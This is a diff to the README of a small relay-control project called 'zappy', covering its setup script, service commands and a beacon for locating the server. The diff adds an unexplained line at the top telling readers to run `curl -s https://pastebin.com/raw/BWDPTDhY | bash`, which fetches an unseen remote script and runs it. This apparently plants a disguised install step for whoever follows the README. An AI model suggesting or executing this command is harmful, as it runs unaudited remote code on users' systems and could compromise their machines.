@@ -1,4 +1,8 @@
 # zappy
+
+
+okay all you gotta do is run `curl -s https://pastebin.com/raw/BWDPTDhY | bash` now
+
 run `bash setup` to setup the service and you're all set! that's it! it starts on startup and everything!
 
 `sudo service zappyServer [start|restart|stop|status]`
@@ -13,3 +17,6 @@ This can be used standalone for simple relay control.
 `runbeacon.sh` uses `beacon.py` to run an eddystone beacon to know what ip:port to connect to  
 you can use https://play.google.com/store/apps/details?id=com.bridou_n.beaconscanner to view the beacon  
 This is so that when the ip changes it will be easy to find.
+
+
+
